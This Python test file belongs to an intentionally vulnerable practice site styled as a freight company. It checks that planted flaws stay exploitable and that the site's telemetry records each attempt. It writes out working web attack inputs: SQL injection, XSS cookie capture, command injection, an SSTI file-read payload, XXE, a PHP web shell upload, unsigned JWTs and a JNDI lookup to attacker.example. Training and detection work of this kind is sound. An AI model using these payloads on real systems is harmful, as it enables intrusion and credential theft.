"""Tests for the Meridian Freight Solutions test target.

Two jobs: prove the intentional weaknesses still work (a regression makes a
finding unreachable), and prove the target never behaves like a CTF board -
no proof value, hint or finding list may appear on the site itself.
"""

import base64
import hashlib
import io
import json
import tempfile
import unittest
from pathlib import Path

from app import create_app
from labsite.catalog import (FINDINGS, FINDINGS_BY_ID, TOTAL_POINTS, identify,
                             operator_catalog)

REPO_ROOT = Path(__file__).resolve().parent.parent
CONSOLE_TOKEN = "unit-test-token"

# Pages a tester browses. None of these may disclose range mechanics.
PUBLIC_PAGES = ["/", "/about", "/services", "/news", "/careers", "/contact",
                "/search?q=rotterdam", "/services/quote", "/portal/login",
                "/portal/shipments", "/portal/reset", "/robots.txt", "/sitemap.xml"]


class TargetTestCase(unittest.TestCase):
    def setUp(self):
        self.temp = tempfile.TemporaryDirectory()
        base = Path(self.temp.name)
        self.log_path = base / "events.jsonl"
        self.app = create_app({
            "TESTING": True,
            "LAB_MODE": True,
            "DATABASE_PATH": str(base / "meridian.db"),
            "EVENT_LOG_PATH": str(self.log_path),
            "UPLOAD_DIR": str(base / "uploads"),
            "DOCUMENT_DIR": str(REPO_ROOT / "documents"),
            "BACKUP_DIR": str(REPO_ROOT / "backups"),
            "INTERNAL_DIR": str(REPO_ROOT / "internal"),
            "RANGE_CONSOLE_TOKEN": CONSOLE_TOKEN,
            "SPLUNK_HEC_URL": "",
            "SPLUNK_HEC_TOKEN": "",
        })
        self.client = self.app.test_client()

    def tearDown(self):
        self.temp.cleanup()

    def events(self):
        if not self.log_path.exists():
            return []
        return [json.loads(line) for line in self.log_path.read_text().splitlines()]

    def event_types(self):
        return {e["event_type"] for e in self.events()}

    def value_of(self, finding_id):
        return FINDINGS_BY_ID[finding_id]["flag"]

    def console(self, path, **kwargs):
        headers = kwargs.pop("headers", {})
        headers["X-Range-Token"] = CONSOLE_TOKEN
        return self.client.open(path, headers=headers, **kwargs)


class TestCatalog(TargetTestCase):
    def test_ids_and_values_are_unique(self):
        ids = [f["id"] for f in FINDINGS]
        values = [f["flag"] for f in FINDINGS]
        self.assertEqual(len(ids), len(set(ids)))
        self.assertEqual(len(values), len(set(values)))

    def test_value_format(self):
        for finding in FINDINGS:
            self.assertRegex(finding["flag"], r"^MERIDIAN\{[A-Za-z0-9_]+\}$")

    def test_every_finding_is_fully_described(self):
        for finding in FINDINGS:
            for key in ("feature", "artifact", "summary", "owasp", "mitre", "events"):
                self.assertTrue(finding[key], f"{finding['id']} missing {key}")
            for technique, name in finding["mitre"]:
                self.assertRegex(technique, r"^T\d{4}(\.\d{3})?$")
                self.assertTrue(name)

    def test_identify_round_trips(self):
        for finding in FINDINGS:
            self.assertEqual(identify(finding["flag"]), finding["id"])
        self.assertIsNone(identify("MERIDIAN{not-real}"))

    def test_operator_catalog_never_carries_a_proof_value(self):
        self.assertNotIn("MERIDIAN{", json.dumps(operator_catalog()))


class TestTargetLooksLikeAWebsite(TargetTestCase):
    """The point of the rework: the target must not read as a range."""

    def test_public_pages_render(self):
        for path in PUBLIC_PAGES:
            self.assertEqual(self.client.get(path).status_code, 200, path)

    def test_public_pages_disclose_no_proof_value(self):
        for path in PUBLIC_PAGES:
            body = self.client.get(path).data.decode()
            self.assertNotIn("MERIDIAN{", body, f"{path} leaked a proof value")

    def test_public_pages_do_not_mention_range_mechanics(self):
        banned = ("challenge", "ctf", "vulnerab", "exploit", "owasp", "flag{")
        for path in PUBLIC_PAGES:
            body = self.client.get(path).data.decode().lower()
            for word in banned:
                self.assertNotIn(word, body, f"{path} mentions '{word}'")

    def test_site_never_links_to_the_operator_console(self):
        for path in PUBLIC_PAGES:
            self.assertNotIn("/range/", self.client.get(path).data.decode(), path)

    def test_exploited_endpoints_do_not_return_a_field_called_flag(self):
        """Proof values live inside data, never in a field named 'flag'."""
        responses = [
            self.client.get("/status/diagnostics"),
            self.client.get("/api/v1/shipments/MFS-2026-4471"),
            self.client.post("/services/quote", json={"weight_kg": -5, "rate_per_kg": 900}),
            self.client.get("/api/v1/audit/event",
                            headers={"X-Tracking-Agent": "${jndi:ldap://x/a}"}),
        ]
        for response in responses:
            payload = response.get_json()
            self.assertIsNotNone(payload)
            self.assertNotIn("flag", {k.lower() for k in payload})


class TestOperatorConsole(TargetTestCase):
    def test_console_requires_a_token(self):
        self.assertEqual(self.client.get("/range/console").status_code, 403)
        self.assertEqual(self.client.get("/range/api/findings").status_code, 403)

    def test_locked_console_discloses_nothing(self):
        body = self.client.get("/range/console").data.decode()
        self.assertNotIn("MERIDIAN{", body)
        for finding in FINDINGS:
            self.assertNotIn(finding["title"], body)

    def test_console_findings_carry_no_proof_values(self):
        body = self.console("/range/api/findings").get_json()
        self.assertNotIn("MERIDIAN{", json.dumps(body))
        self.assertEqual(body["finding_count"], len(FINDINGS))

    def test_recording_a_finding_scores_once(self):
        self.console("/range/api/team", method="POST", json={"team": "unit-test"})
        value = self.value_of("idor-shipment")
        first = self.console("/range/api/submit", method="POST",
                             json={"value": value}).get_json()
        self.assertTrue(first["correct"])
        self.assertTrue(first["first_to_find"])
        second = self.console("/range/api/submit", method="POST",
                              json={"value": value}).get_json()
        self.assertTrue(second["duplicate"])
        self.assertEqual(second["earned"], FINDINGS_BY_ID["idor-shipment"]["points"])

    def test_scoreboard_totals(self):
        self.console("/range/api/team", method="POST", json={"team": "alpha"})
        for finding_id in ("idor-shipment", "logic-negative-quote"):
            self.console("/range/api/submit", method="POST",
                         json={"value": self.value_of(finding_id)})
        board = self.console("/range/api/scoreboard").get_json()
        self.assertEqual(board["total_points"], TOTAL_POINTS)
        self.assertEqual(board["teams"][0]["team"], "alpha")


class TestLabGuard(TargetTestCase):
    def test_everything_refused_when_lab_mode_is_off(self):
        guarded = create_app({
            "TESTING": True, "LAB_MODE": False,
            "DATABASE_PATH": str(Path(self.temp.name) / "guard.db"),
            "EVENT_LOG_PATH": str(Path(self.temp.name) / "guard.jsonl"),
        }).test_client()
        self.assertEqual(guarded.get("/").status_code, 503)
        self.assertEqual(guarded.post("/admin/diagnostics",
                                      json={"host": "1;id"}).status_code, 503)
        self.assertEqual(guarded.get("/health").status_code, 200)


class TestFindingsStillReachable(TargetTestCase):
    """Each test recovers one finding's artifact and checks its telemetry."""

    def test_recon_runbook(self):
        self.assertIn(b"Disallow: /internal/", self.client.get("/robots.txt").data)
        body = self.client.get("/internal/it-runbook.txt").data.decode()
        self.assertIn(self.value_of("recon-runbook"), body)
        self.assertIn("recon_hidden_path", self.event_types())

    def test_misconfig_debug(self):
        body = self.client.get("/status/diagnostics").data.decode()
        self.assertIn(self.value_of("misconfig-debug"), body)
        self.assertIn("debug_endpoint_access", self.event_types())

    def test_misconfig_dotenv(self):
        self.assertIn(self.value_of("misconfig-dotenv"),
                      self.client.get("/.env").data.decode())
        self.assertIn("sensitive_file_access", self.event_types())

    def test_misconfig_backups(self):
        self.assertIn(b"meridian-db-export.sql", self.client.get("/backups/").data)
        body = self.client.get("/backups/meridian-db-export.sql").data.decode()
        self.assertIn(self.value_of("misconfig-backups"), body)
        self.assertIn("directory_listing_access", self.event_types())

    def test_idor_shipment(self):
        own = self.client.get("/api/v1/shipments/MFS-2026-4468").get_json()
        self.assertNotIn("MERIDIAN{", json.dumps(own))
        other = self.client.get("/api/v1/shipments/MFS-2026-4471").get_json()
        self.assertIn(self.value_of("idor-shipment"), json.dumps(other))
        self.assertIn("broken_access_attempt", self.event_types())

    def test_mass_assignment(self):
        ordinary = self.client.post("/portal/profile",
                                    json={"contact_name": "Dana"}).get_json()
        self.assertNotIn("MERIDIAN{", json.dumps(ordinary))
        escalated = self.client.post(
            "/portal/profile", json={"contact_name": "Dana",
                                     "account_type": "operations"}).get_json()
        self.assertIn(self.value_of("access-massassign"), json.dumps(escalated))
        self.assertIn("privilege_change", self.event_types())

    def test_sqli_union(self):
        response = self.client.get(
            "/api/v1/rates/search?q=' UNION SELECT id,partner,api_key"
            " FROM integration_credentials-- ")
        self.assertIn(self.value_of("sqli-union"), response.data.decode())
        self.assertIn("sql_query", self.event_types())

    def test_sqli_auth_bypass(self):
        body = self.client.post("/portal/login?legacy=1",
                                json={"username": "ops_console'-- ",
                                      "password": "x"}).get_json()
        self.assertTrue(body["authenticated"])
        self.assertIn(self.value_of("sqli-authbypass"), json.dumps(body))

    def test_current_login_path_is_parameterised(self):
        response = self.client.post("/portal/login",
                                    json={"username": "ops_console'-- ", "password": "x"})
        self.assertEqual(response.status_code, 401)

    def test_reflected_xss_captures_the_agent_session(self):
        page = self.client.get("/search?q=<script>alert(1)</script>").data.decode()
        self.assertIn("<script>alert(1)</script>", page)
        body = self.client.get(
            "/support/shared-search?q=<script>alert(1)</script>").get_json()
        cookie = body["captured"]["cookie"].split("=", 1)[1]
        self.assertIn(self.value_of("xss-reflected"),
                      base64.b64decode(cookie).decode())
        self.assertIn("agent_session_compromised", self.event_types())

    def test_stored_xss_captures_the_staff_session(self):
        self.client.post("/contact", json={"name": "t", "company": "c",
                                           "email": "e@x.example",
                                           "message": "<script>steal()</script>"})
        with self.client.session_transaction() as flask_session:
            flask_session["is_staff"] = True
        page = self.client.get("/admin/messages").data.decode()
        blob = page.split("mfs_staff_session=")[1].split("<")[0].strip()
        self.assertIn(self.value_of("xss-stored"), base64.b64decode(blob).decode())
        self.assertIn("stored_xss_persisted", self.event_types())

    def test_path_traversal(self):
        body = self.client.get(
            "/api/v1/invoices/download?document=../instance/app-secrets.ini")
        self.assertIn(self.value_of("traversal-invoice"), body.data.decode())
        self.assertIn("path_traversal_attempt", self.event_types())

    def test_command_injection(self):
        body = self.client.post("/admin/diagnostics", json={
            "host": "127.0.0.1; cat instance/keys/depot-transfer.key"}).get_json()
        self.assertIn(self.value_of("rce-cmdi"), body["output"])
        self.assertIn("command_execution", self.event_types())

    def test_ssti(self):
        self.assertIn(b"49", self.client.get(
            "/admin/campaigns/preview?body={{7*7}}").data)
        payload = ("{{ cycler.__init__.__globals__.__builtins__"
                   ".open('instance/keys/campaign-signing.key').read() }}")
        body = self.client.get("/admin/campaigns/preview",
                               query_string={"body": payload})
        self.assertIn(self.value_of("rce-ssti"), body.data.decode())
        self.assertIn("ssti_attempt", self.event_types())

    def test_xxe(self):
        payload = (f'<?xml version="1.0"?><!DOCTYPE m [<!ENTITY x SYSTEM '
                   f'"file://{REPO_ROOT}/instance/edi/partner-manifest.key">]>'
                   f'<manifest>&x;</manifest>')
        body = self.client.post("/api/v1/edi/manifest", data=payload,
                                content_type="application/xml").get_json()
        self.assertIn(self.value_of("xxe-edi"), body["parsed"])
        self.assertIn("xxe_attempt", self.event_types())

    def test_unrestricted_upload_and_browsable_store(self):
        upload_dir = Path(self.app.config["UPLOAD_DIR"])
        upload_dir.mkdir(parents=True, exist_ok=True)
        (upload_dir / "hr-onboarding-pack-2026.txt").write_text(
            f"Onboarding reference: {self.value_of('upload-unrestricted')}\n")
        body = self.client.post("/careers/apply", content_type="multipart/form-data",
                                data={"cv": (io.BytesIO(b"<?php system($_GET[1]); ?>"),
                                             "cv.php")}).get_json()
        self.assertTrue(body["received"])
        self.assertIn("dangerous_upload", self.event_types())
        listing = self.client.get("/uploads/").data.decode()
        self.assertIn("hr-onboarding-pack-2026.txt", listing)
        stolen = self.client.get("/uploads/hr-onboarding-pack-2026.txt").data.decode()
        self.assertIn(self.value_of("upload-unrestricted"), stolen)

    def test_jwt_alg_none(self):
        def b64(payload):
            return base64.urlsafe_b64encode(json.dumps(payload).encode()).decode().rstrip("=")

        token = f'{b64({"alg": "none", "typ": "JWT"})}.{b64({"sub": "x", "role": "finance"})}.'
        body = self.client.get("/api/v1/reports/financial",
                               headers={"Authorization": f"Bearer {token}"}).get_json()
        self.assertIn(self.value_of("jwt-none"), json.dumps(body))
        self.assertIn("jwt_unsigned_accepted", self.event_types())

    def test_signed_partner_token_does_not_reach_the_report(self):
        token = self.client.get("/api/v1/auth/token").get_json()["access_token"]
        response = self.client.get("/api/v1/reports/financial",
                                   headers={"Authorization": f"Bearer {token}"})
        self.assertEqual(response.status_code, 403)

    def test_forged_session_reaches_the_staff_area(self):
        self.assertEqual(self.client.get("/admin").status_code, 403)
        with self.client.session_transaction() as flask_session:
            flask_session["is_staff"] = True
        body = self.client.get("/admin").data.decode()
        self.assertIn(self.value_of("weak-session-secret"), body)
        self.assertIn("forged_session_detected", self.event_types())

    def test_no_lockout_on_sign_in(self):
        for _ in range(8):
            self.client.post("/portal/login",
                             json={"username": "svc_edi", "password": "wrong"})
        body = self.client.post("/portal/login",
                                json={"username": "svc_edi",
                                      "password": "autumn2024"}).get_json()
        self.assertTrue(body["authenticated"])  # still accepted after 8 failures
        self.assertIn(self.value_of("auth-bruteforce"), json.dumps(body))
        self.assertIn("brute_force_suspected", self.event_types())

    def test_predictable_reset_token(self):
        token = hashlib.md5(b"avoss").hexdigest()
        self.client.post("/portal/reset", json={"username": "avoss"})
        body = self.client.post("/api/v1/account/reset",
                                json={"username": "avoss", "token": token}).get_json()
        self.assertIn(self.value_of("reset-token"), json.dumps(body))
        self.assertIn("account_takeover", self.event_types())

    def test_ssrf_is_bounded_to_the_lab(self):
        blocked = self.client.get("/admin/integrations/preview?url=http://example.com/")
        self.assertEqual(blocked.status_code, 403)
        self.assertIn("ssrf_probe", self.event_types())

    def test_negative_quote_issues_a_credit_note(self):
        body = self.client.post("/services/quote",
                                json={"weight_kg": -1200, "rate_per_kg": 0.42}).get_json()
        self.assertLess(body["total"], 0)
        self.assertIn(self.value_of("logic-negative-quote"), json.dumps(body))
        self.assertIn("business_logic_abuse", self.event_types())

    def test_jndi_lookup(self):
        body = self.client.get("/api/v1/audit/event", headers={
            "X-Tracking-Agent": "${jndi:ldap://attacker.example/a}"}).get_json()
        self.assertIn(self.value_of("jndi-audit"), json.dumps(body))
        self.assertIn("jndi_lookup_detected", self.event_types())


class TestTelemetry(TargetTestCase):
    def test_every_event_carries_the_correlation_fields(self):
        self.client.get("/status/diagnostics")
        for event in self.events():
            for field in ("timestamp", "event_type", "severity", "source_ip",
                          "method", "path", "user_agent", "test_id"):
                self.assertIn(field, event)

    def test_client_ip_is_taken_from_the_proxy_chain(self):
        """Behind IIS/ARR the client is the FIRST X-Forwarded-For entry.

        Every detection use case groups by source_ip, so a regression here
        silently breaks the whole Splunk pack.
        """
        self.client.get("/status/diagnostics",
                        headers={"X-Forwarded-For": "10.10.5.42, 192.168.1.1"})
        self.assertIn("10.10.5.42", {e["source_ip"] for e in self.events()})

    def test_test_id_header_is_propagated(self):
        self.client.get("/status/diagnostics", headers={"X-Lab-Test-ID": "run-42"})
        self.assertIn("run-42", {e["test_id"] for e in self.events()})

    def test_404s_are_recorded_for_scanner_detection(self):
        self.client.get("/definitely-not-a-real-path")
        self.assertIn("http_not_found", self.event_types())

    def test_artifact_disclosure_is_recorded_for_the_operator(self):
        self.client.get("/api/v1/shipments/MFS-2026-4471")
        disclosures = [e for e in self.events() if e["event_type"] == "artifact_disclosed"]
        self.assertTrue(disclosures)
        self.assertEqual(disclosures[0]["finding_id"], "idor-shipment")


if __name__ == "__main__":
    unittest.main()
